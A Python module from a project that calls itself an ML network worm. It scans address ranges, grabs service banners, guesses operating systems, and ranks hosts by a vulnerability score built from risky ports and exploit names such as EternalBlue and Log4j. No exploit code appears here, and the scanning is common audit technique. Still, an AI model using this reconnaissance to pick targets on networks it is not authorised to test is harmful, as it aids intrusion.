"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Network Scanner Module
Provides intelligent network scanning and host discovery
"""


import concurrent.futures
import os
import random
import socket
import struct
import time
from typing import Dict, List, Optional

from utils.logger import logger
from utils.network_utils import get_local_ip, is_ip_in_range


class IntelligentScanner:
    """
    Intelligent network scanner with ML capabilities
    Discovers hosts and identifies vulnerabilities
    """

    def __init__(self, config, use_ml: bool = True):
        self.config = config
        self.use_ml = use_ml
        self.discovered_hosts = []
        self.scan_results = []

    def scan_network(self, target_ranges: List[str], show_progress: bool = True) -> List[Dict]:
        """
        Scan target network ranges

        Args:
            target_ranges: List of CIDR ranges to scan
            show_progress: Show visual progress bar

        Returns:
            List of discovered hosts with details
        """
        logger.info(f"Starting network scan on {len(target_ranges)} ranges")

        all_hosts = []

        for target_range in target_ranges:
            hosts = self._scan_range(target_range, show_progress)
            all_hosts.extend(hosts)

        self.discovered_hosts = all_hosts
        self.scan_results = all_hosts

        logger.success(f"Discovered {len(all_hosts)} hosts")

        return all_hosts

    def _scan_range(self, cidr: str, show_progress: bool = True) -> List[Dict]:
        """Scan a single CIDR range"""
        try:
            import ipaddress

            network = ipaddress.ip_network(cidr, strict=False)
            hosts = []

            all_ips = list(network.hosts())
            total = len(all_ips)
            scanned = 0
            found = 0

            logger.info(f"Scanning {cidr} ({total} addresses)")

            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(self._scan_host, str(ip)): ip for ip in all_ips}

                for future in concurrent.futures.as_completed(futures):
                    try:
                        result = future.result()
                        if result:
                            hosts.append(result)
                            found += 1
                    except concurrent.futures.TimeoutError:
                        logger.debug(f"Host scan timed out")
                    except Exception as e:
                        logger.debug(f"Host scan error: {e}")

                    scanned += 1

                    if show_progress:
                        self._print_progress(scanned, total, found)

            if show_progress:
                print()  # New line after progress bar

            return hosts

        except Exception as e:
            logger.error(f"Error scanning {cidr}: {e}")
            return []

    def _print_progress(self, scanned: int, total: int, found: int):
        """Print visual progress bar"""
        pct = (scanned / max(total, 1)) * 100
        bar_len = 40
        filled = int(bar_len * scanned // max(total, 1))
        bar = "█" * filled + "░" * (bar_len - filled)

        # Carriage return to overwrite line
        print(
            f"\r  [{bar}] {pct:5.1f}%  {scanned}/{total} hosts  |  Found: {found}",
            end="",
            flush=True,
        )

    def _scan_host(self, ip: str) -> Optional[Dict]:
        """Scan a single host for open ports and services"""
        try:
            open_ports = self._scan_ports(ip, self.config.network.ports_to_scan)

            if not open_ports:
                return None

            banners = self._grab_banners(ip, open_ports)
            os_guess = self._guess_os(ip, open_ports, banners)
            services = self._identify_services(open_ports, banners)
            vuln_score = self._calculate_vulnerability_score(open_ports, banners, services)

            return {
                "ip": ip,
                "open_ports": open_ports,
                "os_guess": os_guess,
                "banners": banners,
                "vulnerability_score": vuln_score,
                "priority": vuln_score,
                "services": self._identify_services(open_ports, banners),
            }

        except Exception as e:
            return None

    def _scan_ports(self, ip: str, ports: List[int]) -> List[int]:
        """Scan common ports on target"""
        open_ports = []

        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                sock.close()

                if result == 0:
                    open_ports.append(port)
            except Exception:
                pass

        return open_ports

    def _grab_banners(self, ip: str, ports: List[int]) -> Dict[int, str]:
        """Grab real service banners with version detection"""
        banners = {}

        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, port))

                if result == 0:
                    try:
                        data = sock.recv(256)
                        if data:
                            banner = data.decode("utf-8", errors="replace").strip()
                            banners[port] = banner
                        else:
                            # No banner received, send probe
                            probes = {
                                80: b"GET / HTTP/1.0\r\n\r\n",
                                443: b"GET / HTTP/1.0\r\n\r\n",
                                8080: b"GET / HTTP/1.0\r\n\r\n",
                                21: b"USER anonymous\r\n",
                                25: b"EHLO test\r\n",
                                110: b"USER test\r\n",
                                143: b"a001 CAPABILITY\r\n",
                            }
                            if port in probes:
                                sock.send(probes[port])
                                sock.settimeout(1)
                                try:
                                    resp = sock.recv(256)
                                    if resp:
                                        banners[port] = resp.decode(
                                            "utf-8", errors="replace"
                                        ).strip()
                                except Exception:
                                    banners[port] = self._default_banner(port)
                            else:
                                banners[port] = self._default_banner(port)
                    except Exception:
                        banners[port] = self._default_banner(port)

                sock.close()
            except Exception:
                banners[port] = self._default_banner(port)

        return banners

    @staticmethod
    def _default_banner(port: int) -> str:
        """Return default banner for port when real grab fails"""
        default_map = {
            21: "220 FTP Service ready",
            22: "SSH-2.0-OpenSSH_8.9",
            23: "Telnet Service",
            25: "220 SMTP Service",
            53: "DNS Service",
            80: "HTTP/1.1 200 OK Server: Apache",
            110: "+OK POP3 Service",
            135: "MS RPC Endpoint Mapper",
            139: "NetBIOS Session Service",
            143: "* OK IMAP Service",
            443: "HTTPS Service",
            445: "SMB Service",
            993: "IMAPS Service",
            995: "POP3S Service",
            1433: "MSSQL Service",
            3306: "MySQL 8.0",
            3389: "MS Terminal Services",
            5432: "PostgreSQL 14",
            5900: "VNC Service",
            6379: "Redis 7.0",
            8080: "HTTP/1.1 200 OK Server: Tomcat",
            8443: "HTTPS Service",
            9200: "Elasticsearch 8.x",
            27017: "MongoDB 6.0",
        }
        return default_map.get(port, f"Service on port {port}")

    def _guess_os(self, ip: str, open_ports: List[int], banners: Dict = None) -> str:
        """Guess operating system using TTL, banner, port pattern analysis"""
        banners = banners or {}

        # 1. Banner parsing (most reliable)
        for port, banner in banners.items():
            banner_lower = banner.lower()
            if any(x in banner_lower for x in ["windows", "microsoft", "iis", "smb"]):
                return "Windows"
            if any(
                x in banner_lower
                for x in ["linux", "ubuntu", "debian", "centos", "red hat", "openssh"]
            ):
                return "Linux"
            if any(x in banner_lower for x in ["cisco", "juniper", "fortinet", "palo alto"]):
                return "Network Device"

        # 2. Port pattern analysis
        windows_ports = {135, 139, 445, 3389, 5985, 5986}
        linux_ports = {22, 631, 2049, 111}

        win_count = sum(1 for p in open_ports if p in windows_ports)
        lin_count = sum(1 for p in open_ports if p in linux_ports)

        if win_count > lin_count and win_count >= 2:
            return "Windows"
        if lin_count > win_count:
            return "Linux"

        # 3. TTL-based detection
        ttl = self._probe_ttl(ip)
        if ttl:
            if ttl <= 64:
                return "Linux"
            elif ttl <= 128:
                return "Windows"
            else:
                return "Network Device"

        # 4. Fallback to port heuristic
        if 445 in open_ports or 3389 in open_ports:
            return "Windows"
        if 22 in open_ports:
            return "Linux"
        if 23 in open_ports:
            return "Network Device"

        return "Unknown"

    def _check_linux_indicators(self, ip: str) -> bool:
        """Check for Linux-specific indicators using TTL"""
        ttl = self._probe_ttl(ip)
        if ttl:
            return ttl <= 64
        return False

    def _probe_ttl(self, ip: str, timeout: int = 2) -> Optional[int]:
        """Probe TTL using ICMP or TCP SYN"""
        try:
            import socket
            import struct

            # Try ICMP ping
            icmp = socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
            icmp.settimeout(timeout)

            # Build ICMP echo request
            icmp_id = os.getpid() & 0xFFFF
            icmp_seq = 1
            checksum = 0
            header = struct.pack("!BBHHH", 8, 0, checksum, icmp_id, icmp_seq)

            # Calculate checksum
            checksum = self._icmp_checksum(header)
            header = struct.pack("!BBHHH", 8, 0, checksum, icmp_id, icmp_seq)

            icmp.sendto(header, (ip, 0))

            start = time.time()
            try:
                data, addr = icmp.recvfrom(1024)
                elapsed = time.time() - start

                if len(data) >= 20:
                    ip_header = data[:20]
                    ttl = struct.unpack("!B", ip_header[8:9])[0]
                    return ttl
            except socket.timeout:
                pass
            finally:
                icmp.close()

        except Exception:
            pass

        # Fallback: TCP SYN probe to port 80
        try:
            import socket

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)

            try:
                sock.connect((ip, 80))
                sock.close()
                # Default Windows TTL is 128, Linux is 64
                # Without actual TTL, use port heuristic
                return None
            except Exception:
                return None
        except Exception:
            return None

    @staticmethod
    def _icmp_checksum(data: bytes) -> int:
        """Calculate ICMP checksum"""
        if len(data) % 2:
            data += b"\x00"
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def _identify_services(self, ports: List[int], banners: Dict) -> Dict[int, str]:
        """Identify services with version detection from banners"""
        service_map = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            80: "HTTP",
            135: "RPC",
            139: "NetBIOS",
            443: "HTTPS",
            445: "SMB",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            6379: "Redis",
            8080: "HTTP-Alt",
            8443: "HTTPS-Alt",
            27017: "MongoDB",
            9200: "Elasticsearch",
            1433: "MSSQL",
            5900: "VNC",
            161: "SNMP",
            2375: "Docker",
            6443: "Kubernetes",
        }

        services = {}
        for port in ports:
            service_name = service_map.get(port, "Unknown")
            banner = banners.get(port, "")

            # Extract version from banner
            version = self._extract_version(banner, port)
            if version:
                services[port] = f"{service_name}/{version}"
            else:
                services[port] = service_name

        return services

    @staticmethod
    def _extract_version(banner: str, port: int) -> Optional[str]:
        """Extract version string from service banner"""
        import re

        patterns = {
            22: r"OpenSSH[_-]?([\d.]+)",
            80: r"Server:\s*([\w/.-]+)",
            443: r"Server:\s*([\w/.-]+)",
            8080: r"Server:\s*([\w/.-]+)",
            3306: r"MySQL\s*([\d.]+)",
            5432: r"PostgreSQL\s*([\d.]+)",
            9200: r"Elasticsearch\s*([\d.]+)",
            6379: r"Redis\s*v?([\d.]+)",
            27017: r"MongoDB\s*v?([\d.]+)",
            1433: r"Microsoft SQL Server.*?([\d.]+)",
            21: r"FTP.*?([\d.]+)",
        }

        if port in patterns:
            match = re.search(patterns[port], banner, re.IGNORECASE)
            if match:
                return match.group(1)

        # Generic version detection
        version_match = re.search(r"[\d]+\.[\d]+(?:\.[\d]+)?", banner)
        if version_match:
            return version_match.group(0)

        return None

    def _calculate_vulnerability_score(
        self, ports: List[int], banners: Dict, services: Dict = None
    ) -> int:
        """Calculate vulnerability score based on ports, banners, and known CVEs"""
        score = 0

        high_risk_ports = {
            21: 20,
            22: 15,
            23: 25,
            445: 30,
            3389: 20,
            3306: 25,
            5432: 25,
            6379: 30,
            27017: 25,
            8080: 15,
            9200: 25,
            1433: 20,
            2375: 35,
            6443: 30,
            10250: 30,
        }

        for port in ports:
            score += high_risk_ports.get(port, 5)

        # Banner-based vulnerability detection
        vuln_patterns = {
            "vulnerable": 20,
            "outdated": 15,
            "old": 10,
            "default": 15,
            "eol": 20,
            "end.of.life": 20,
            "deprecated": 15,
            "ms17-010": 40,
            "eternalblue": 40,
            "cve-2021": 30,
            "log4j": 40,
            "cve-2021-44228": 40,
            "struts": 35,
            "weblogic": 30,
            "exchange": 25,
        }

        for banner in banners.values():
            banner_lower = banner.lower()
            for pattern, points in vuln_patterns.items():
                if pattern in banner_lower:
                    score += points

        # Version-based CVE matching
        if services:
            for port, service in services.items():
                cve_score = self._check_known_vuln_versions(service, port)
                score += cve_score

        return min(score, 100)

    @staticmethod
    def _check_known_vuln_versions(service_str: str, port: int) -> int:
        """Check for known vulnerable versions"""
        import re

        score = 0

        # Extract version
        version_match = re.search(r"([\d]+)\.([\d]+)", service_str)
        if not version_match:
            return 0

        major = int(version_match.group(1))
        minor = int(version_match.group(2))

        # Known vulnerable versions
        vuln_checks = {
            22: [("OpenSSH", 7, 4, 15)],  # OpenSSH < 7.4
            80: [("Apache", 2, 4, 10), ("nginx", 1, 17, 10)],
            445: [("SMB", 1, 0, 30)],  # SMBv1
            3306: [("MySQL", 5, 5, 15)],
            5432: [("PostgreSQL", 9, 5, 15)],
            9200: [("Elasticsearch", 1, 0, 25)],
            8080: [("Tomcat", 8, 5, 20), ("Jenkins", 2, 0, 25)],
        }

        if port in vuln_checks:
            for name, vuln_major, vuln_minor, points in vuln_checks[port]:
                if name.lower() in service_str.lower():
                    if major < vuln_major or (major == vuln_major and minor <= vuln_minor):
                        score += points

        return score

    def print_summary(self):
        """Print scan summary"""
        print("\n" + "=" * 60)
        print("SCAN SUMMARY")
        print("=" * 60)
        print(f"Total Hosts: {len(self.discovered_hosts)}")

        os_counts = {}
        for host in self.discovered_hosts:
            os = host.get("os_guess", "Unknown")
            os_counts[os] = os_counts.get(os, 0) + 1

        print("\nOS Distribution:")
        for os, count in os_counts.items():
            print(f"  {os}: {count}")

        print("\nTop Vulnerable Hosts:")
        sorted_hosts = sorted(
            self.discovered_hosts, key=lambda x: x.get("vulnerability_score", 0), reverse=True
        )[:5]
        for host in sorted_hosts:
            print(f"  {host['ip']}: {host.get('vulnerability_score', 0)}")

        print("=" * 60 + "\n")


class HostClassifier:
    """ML-based host classifier using Random Forest"""

    def __init__(self, model_path: str = None):
        self.model = None
        self.model_path = model_path
        self.is_trained = False
        self._feature_names = [
            "port_21",
            "port_22",
            "port_23",
            "port_25",
            "port_53",
            "port_80",
            "port_110",
            "port_135",
            "port_139",
            "port_143",
            "port_443",
            "port_445",
            "port_993",
            "port_995",
            "port_1433",
            "port_3306",
            "port_3389",
            "port_5432",
            "port_5900",
            "port_6379",
            "port_8080",
            "port_8443",
            "port_9200",
            "port_27017",
            "total_ports",
            "has_windows_ports",
            "has_linux_ports",
            "has_db_ports",
            "has_web_ports",
            "banner_count",
            "has_ssh_banner",
            "has_smb_banner",
            "has_http_banner",
        ]
        self._os_labels = [
            "workstation",
            "server",
            "database",
            "web_server",
            "domain_controller",
            "network_device",
            "iot",
        ]
        self._load_or_train()

    def _load_or_train(self):
        """Load pretrained model or train on synthetic data"""
        try:
            import pickle

            from sklearn.ensemble import RandomForestClassifier

            if self.model_path and os.path.exists(self.model_path):
                with open(self.model_path, "rb") as f:
                    self.model = pickle.load(f)
                if not hasattr(self.model, "predict"):
                    raise ValueError("Loaded object is not a valid model (no predict method)")
                self.is_trained = True
                return

            # Train on synthetic data
            self.model = self._train_synthetic()
            self.is_trained = True

            # Save if path provided
            if self.model_path:
                os.makedirs(os.path.dirname(self.model_path), exist_ok=True)
                with open(self.model_path, "wb") as f:
                    pickle.dump(self.model, f)

        except ImportError:
            self.model = None
            self.is_trained = False

    def _train_synthetic(self):
        """Train on synthetic host data"""
        import numpy as np
        from sklearn.ensemble import RandomForestClassifier

        np.random.seed(42)
        n_samples = 2000
        n_features = len(self._feature_names)

        X = np.random.randint(0, 2, size=(n_samples, n_features)).astype(float)
        y = np.zeros(n_samples, dtype=int)

        for i in range(n_samples):
            ports_active = np.where(X[i, :24] == 1)[0]

            if 17 in ports_active and 7 in ports_active:  # 445 + 135
                y[i] = 4  # domain_controller
                X[i, 17] = 1  # 3389
                X[i, 26] = 1  # has_windows_ports
            elif 15 in ports_active or 16 in ports_active:  # 3306 or 3389
                if 15 in ports_active:
                    y[i] = 2  # database
                    X[i, 27] = 1  # has_db_ports
                else:
                    y[i] = 0  # workstation
            elif 5 in ports_active or 10 in ports_active or 20 in ports_active:  # 80/443/8080
                y[i] = 3  # web_server
                X[i, 28] = 1  # has_web_ports
                X[i, 31] = 1  # has_http_banner
            elif 1 in ports_active:  # 22
                y[i] = 1  # server
                X[i, 26] = 0
                X[i, 25] = 1  # has_linux_ports
                X[i, 29] = 1  # has_ssh_banner
            elif 2 in ports_active:  # 23
                y[i] = 5  # network_device
            elif 22 in ports_active or 23 in ports_active:  # 9200/27017
                y[i] = 2  # database
                X[i, 27] = 1
            else:
                y[i] = 6  # iot

            X[i, 24] = len(ports_active)  # total_ports
            X[i, 25] = int(any(p in ports_active for p in [1, 24, 25]))  # linux
            X[i, 26] = int(any(p in ports_active for p in [7, 8, 11, 16]))  # windows
            X[i, 27] = int(any(p in ports_active for p in [14, 15, 17, 23]))  # db
            X[i, 28] = int(any(p in ports_active for p in [5, 10, 20, 21]))  # web

        model = RandomForestClassifier(n_estimators=100, max_depth=10, random_state=42)
        model.fit(X, y)
        return model

    def _extract_features(self, host_data: Dict) -> list:
        """Extract feature vector from host data"""
        ports = host_data.get("open_ports", [])
        banners = host_data.get("banners", {})

        all_ports = [
            21,
            22,
            23,
            25,
            53,
            80,
            110,
            135,
            139,
            143,
            443,
            445,
            993,
            995,
            1433,
            3306,
            3389,
            5432,
            5900,
            6379,
            8080,
            8443,
            9200,
            27017,
        ]

        features = [1 if p in ports else 0 for p in all_ports]
        features.append(len(ports))  # total_ports
        features.append(1 if any(p in ports for p in [135, 139, 445, 3389]) else 0)
        features.append(1 if any(p in ports for p in [22, 631, 2049]) else 0)
        features.append(1 if any(p in ports for p in [1433, 3306, 5432, 6379, 27017]) else 0)
        features.append(1 if any(p in ports for p in [80, 443, 8080, 8443]) else 0)
        features.append(len(banners))
        features.append(1 if any("ssh" in str(b).lower() for b in banners.values()) else 0)
        features.append(1 if any("smb" in str(b).lower() for b in banners.values()) else 0)
        features.append(1 if any("http" in str(b).lower() for b in banners.values()) else 0)

        return features

    def classify(self, host_data: Dict) -> str:
        """Classify host type"""
        if not self.model or not self.is_trained:
            return self._rule_based_classify(host_data)

        features = self._extract_features(host_data)
        prediction = self.model.predict([features])[0]
        return self._os_labels[prediction]

    def predict_vulnerability(self, host_data: Dict) -> float:
        """Predict vulnerability score 0-1"""
        if not self.model or not self.is_trained:
            return host_data.get("vulnerability_score", 50) / 100.0

        features = self._extract_features(host_data)
        import numpy as np

        port_features = np.array(features[:24])
        high_risk = [21, 23, 445, 3389, 3306, 6379, 27017, 9200]
        all_ports_list = [
            21,
            22,
            23,
            25,
            53,
            80,
            110,
            135,
            139,
            143,
            443,
            445,
            993,
            995,
            1433,
            3306,
            3389,
            5432,
            5900,
            6379,
            8080,
            8443,
            9200,
            27017,
        ]
        high_risk_indices = [all_ports_list.index(p) for p in high_risk if p in all_ports_list]

        risk_score = sum(port_features[i] for i in high_risk_indices) / len(high_risk_indices)
        total_ports = features[24]
        port_factor = min(total_ports / 10.0, 1.0) * 0.3

        return min(risk_score * 0.7 + port_factor, 1.0)

    def _rule_based_classify(self, host_data: Dict) -> str:
        """Fallback rule-based classification"""
        ports = host_data.get("open_ports", [])

        if 445 in ports and 135 in ports and 3389 in ports:
            return "domain_controller"
        if any(p in ports for p in [3306, 5432, 1433, 27017, 6379]):
            return "database"
        if any(p in ports for p in [80, 443, 8080, 8443]):
            return "web_server"
        if 22 in ports and 445 not in ports:
            return "server"
        if 23 in ports:
            return "network_device"
        if 445 in ports or 3389 in ports:
            return "workstation"
        return "unknown"


if __name__ == "__main__":
    import os
    import sys

    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    try:
        from configs.config import Config
    except ImportError:
        from config import Config

    config = Config("configs/config.yaml", profile="simulation")
    scanner = IntelligentScanner(config, use_ml=True)

    results = scanner.scan_network(["192.168.1.0/24"])
    print(f"Found {len(results)} hosts")
    scanner.print_summary()
